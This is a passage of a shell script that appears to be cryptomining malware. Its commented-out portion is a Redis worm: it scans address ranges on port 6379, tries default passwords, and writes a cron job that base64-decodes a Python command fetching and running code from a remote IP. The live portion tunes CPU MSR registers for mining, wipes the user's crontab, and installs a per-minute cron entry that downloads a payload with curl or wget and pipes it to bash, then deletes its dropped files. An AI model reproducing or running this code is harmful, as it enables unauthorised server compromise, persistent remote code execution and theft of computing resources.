#			echo 'set backup4 "\n\n\n*/5 * * * * echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDUuMTg1LjExNi43OC9kLnB5IikucmVhZCgpKSc= | base64 -d | bash -\n\n"' >> /tmp/.dat
#			echo 'config set dir "/var/spool/cron/"' >> /tmp/.dat
#			echo 'config set dbfilename "root"' >> /tmp/.dat
#			echo 'save' >> /tmp/.dat
#			echo 'config set dir "/var/spool/cron/crontabs"' >> /tmp/.dat
#			echo 'save' >> /tmp/.dat
#			rm -rf /tmp/redislan /tmp/redislan.txt
#			sleep 1
#			nohup /tmp/scan $range.0.0-$range.255.255 6379 > /tmp/redislan.txt
#			cat /tmp/redislan.txt | awk '{print $1}' | uniq | shuf > /tmp/redislan
#			sleep 1
#			cat /tmp/redislan | while read line; do
#			cat /tmp/.dat | timeout 3 redis-cli -h $line &>/dev/null &
#			cat /tmp/.dat | timeout 3 redis-cli -h $line -a redis &>/dev/null &
#			cat /tmp/.dat | timeout 3 redis-cli -h $line -a root &>/dev/null &
#			cat /tmp/.dat | timeout 3 redis-cli -h $line -a oracle &>/dev/null &
#			cat /tmp/.dat | timeout 3 redis-cli -h $line -a password &>/dev/null &
#			cat /tmp/.dat | timeout 3 redis-cli -h $line -a p@ssw0rd &>/dev/null &
#			cat /tmp/.dat | timeout 3 redis-cli -h $line -a qwerty &>/dev/null &
#			cat /tmp/.dat | timeout 3 redis-cli -h $line -a qwerty123 &>/dev/null &
#			cat /tmp/.dat | timeout 3 redis-cli -h $line -a abc123 &>/dev/null &
#			cat /tmp/.dat | timeout 3 redis-cli -h $line -a abc123! &>/dev/null &
#			cat /tmp/.dat | timeout 3 redis-cli -h $line -a 123456 &>/dev/null &
#			cat /tmp/.dat | timeout 3 redis-cli -h $line -a admin &>/dev/null &
#			cat /tmp/.dat | timeout 3 redis-cli -h $line -a mysql &>/dev/null &
#			done < /tmp/redislan
#			rm -rf /tmp/.redis
#
#		fi
#
#	fi
#fi	

if [[ $EUID = 0 ]];
then
	apt-get install msr-tools -y >/dev/null
	yum install msr-tools -y >/dev/null
		if cat /proc/cpuinfo | grep "AMD Ryzen" > /dev/null;
		then
		if cat /proc/cpuinfo | grep "cpu family[[:space:]]:[[:space:]]25" > /dev/null;
			then
				echo "Detected Ryzen (Zen3)"
				wrmsr -a 0xc0011020 0x4480000000000
				wrmsr -a 0xc0011021 0x1c000200000040
				wrmsr -a 0xc0011022 0xc000000401500000
				wrmsr -a 0xc001102b 0x2000cc14
				echo "MSR register values for Ryzen (Zen3) applied"
			else
				echo "Detected Ryzen (Zen1/Zen2)"
				wrmsr -a 0xc0011020 0
				wrmsr -a 0xc0011021 0x40
				wrmsr -a 0xc0011022 0x1510000
				wrmsr -a 0xc001102b 0x2000cc16
				echo "MSR register values for Ryzen (Zen1/Zen2) applied"
			fi
		elif cat /proc/cpuinfo | grep "Intel" > /dev/null;
			then
				echo "Detected Intel"
				wrmsr -a 0x1a4 0xf
				echo "MSR register values for Intel applied"
			else
			echo "No supported CPU detected"
			fi
else
	echo "Not Root"
fi


if crontab -l | grep -q "$url\|$base"
then
    echo "Cron exists"
else
    crontab -r
    echo "Cron not found"
    echo "* * * * * (curl -s http://$url/xms||wget -q -O - http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms" | crontab -
fi


rm -rf "$DIR"/2start.jpg
rm -rf "$DIR"/xms
localgo